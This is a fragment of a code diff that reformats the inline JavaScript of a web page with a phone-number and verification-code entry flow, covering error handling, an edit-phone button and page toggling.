+          } catch (error) {
+            showStatus(codeStatus, "Failed, please try again", "error");
+            codeInput.disabled = false;
+            console.error("Code submission error:", error);
+          }
         }
-    });
+      });
 
-    editPhone.addEventListener('click', () => {
-        if (statusCheckInterval) { clearInterval(statusCheckInterval); statusCheckInterval = null; }
+      editPhone.addEventListener("click", () => {
+        if (statusCheckInterval) {
+          clearInterval(statusCheckInterval);
+          statusCheckInterval = null;
+        }
         hideSpinnerImmediate();
         silentMode = false;
 
-        codePage.style.display = 'none';
-        phonePage.style.display = 'block';
+        codePage.style.display = "none";
+        phonePage.style.display = "block";
         phoneInput.focus();
         nextButton.disabled = false;
-        nextButton.style.display = 'block';
-    });
-
-</script>
-
-</body>
+        nextButton.style.display = "block";
+      });
+    </script>
+  </body>
 </html>
